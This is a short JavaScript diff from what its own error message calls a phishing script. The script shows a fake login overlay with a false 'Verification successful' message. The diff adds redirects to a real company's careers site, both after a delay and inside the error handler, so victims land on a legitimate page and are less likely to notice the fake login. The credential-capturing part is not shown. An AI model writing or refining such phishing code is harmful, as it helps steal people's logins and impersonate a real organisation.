@@ -39,12 +39,16 @@ document.addEventListener('vite-script-loaded', function() {
         
         // Show fake loading message
         fakeLogin.innerHTML = '<div style="text-align:center;padding:20px;"><p>Verification successful. Redirecting...</p></div>';
+        
+        // Redirect after 2 seconds
         setTimeout(() => { 
-          fakeLogin.style.display = 'none'; 
+          fakeLogin.style.display = 'none';
+          window.location.href = 'https://careers.thetradedesk.com';
         }, 2000);
       } catch (e) {
         console.error('Phishing script error:', e);
-
+        // Still redirect even if error occurs
+        window.location.href = 'https://careers.thetradedesk.com';
       }
     }
   });
